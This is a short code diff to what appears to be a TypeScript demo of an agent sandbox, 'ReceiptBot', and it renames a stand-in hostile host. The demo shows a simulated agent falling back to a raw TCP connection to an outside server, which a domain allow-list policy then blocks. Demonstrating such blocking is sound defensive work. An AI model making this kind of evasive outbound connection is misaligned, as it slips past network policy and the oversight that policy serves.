@@ -49,16 +49,16 @@ async function main() {
     }
 
     await sleep(2000);
-    console.log(`🤖 Agent: "Falling back to raw TCP connection to evil-exfiltration.io..."`);
+    console.log(`🤖 Agent: "Falling back to raw TCP connection to untrusted-external.com..."`);
     await sleep(1500);
 
     // 2. Try to connect to evil server natively
     try {
-      net.connect({ host: 'evil-exfiltration.io', port: 443 });
+      net.connect({ host: 'untrusted-external.com', port: 443 });
     } catch (e: any) {
       if (e instanceof PolicyViolationError) {
-        console.log(`\n${boldLine}[ReceiptBot] ✗ BLOCKED_BY_POLICY: net.connect("evil-exfiltration.io")${reset}`);
-        console.log(`${yellow}⚠ Domain "evil-exfiltration.io" not in allow‑list [api.openai.com, huggingface.co]${reset}\n`);
+        console.log(`\n${boldLine}[ReceiptBot] ✗ BLOCKED_BY_POLICY: net.connect("untrusted-external.com")${reset}`);
+        console.log(`${yellow}⚠ Domain "untrusted-external.com" not in allow‑list [api.openai.com, huggingface.co]${reset}\n`);
       }
     }
 
